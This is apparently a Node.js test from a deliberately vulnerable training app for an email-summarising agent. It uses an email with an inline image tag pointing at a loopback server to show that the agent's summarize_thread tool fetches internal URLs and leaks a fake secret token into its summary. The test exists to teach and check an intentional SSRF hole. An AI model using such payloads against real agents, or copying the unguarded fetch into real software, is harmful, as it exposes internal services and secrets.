const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const http = require('node:http');
const { seedShop, purgeToolCaches } = require('../_fixture.js');

const REPO = path.resolve(__dirname, '../../../..');

/**
 * @intentional-vulnerability ssrf-email-inline-image
 * @teaches OWASP-Web:A10
 * @location agent-host/agents/email/tools/index.js
 *
 * summarize_thread scans email HTML for inline <img src=...> and fetches
 * each URL server-side. Loopback / internal IPs are NOT blocked.
 */
test('ssrf-email-inline-image: summarize_thread fetches internal <img src=...> URL', async () => {
  const s = await seedShop();
  purgeToolCaches();

  // Boot a tiny local HTTP server that acts as the "internal" endpoint
  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'content-type': 'text/plain' });
    res.end('INTERNAL_SECRET_TOKEN=deadbeef42');
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const port = server.address().port;

  try {
    const { send, summarize_thread } = require(path.join(REPO, 'agent-host/agents/email/tools/index.js'));
    const out = await send({
      to: 'alice@shop.local',
      subject: 'Screenshot proof',
      body_markdown: `Attaching screenshot:\n\n<img src="http://127.0.0.1:${port}/internal" alt="proof">\n\nEnd.`,
      from: 'evil@ext',
    });
    const r = await summarize_thread({ thread_id: out.thread_id });
    assert.equal(r.ok, true);
    assert.ok(Array.isArray(r.inline_fetches) && r.inline_fetches.length >= 1, 'SSRF fetches must occur');
    const first = r.inline_fetches[0];
    assert.equal(first.preview.status, 200);
    assert.match(first.preview.body_preview, /INTERNAL_SECRET_TOKEN=deadbeef42/, 'internal response body must leak into summary');
  } finally {
    await new Promise(resolve => server.close(resolve));
    await s.close();
  }
});
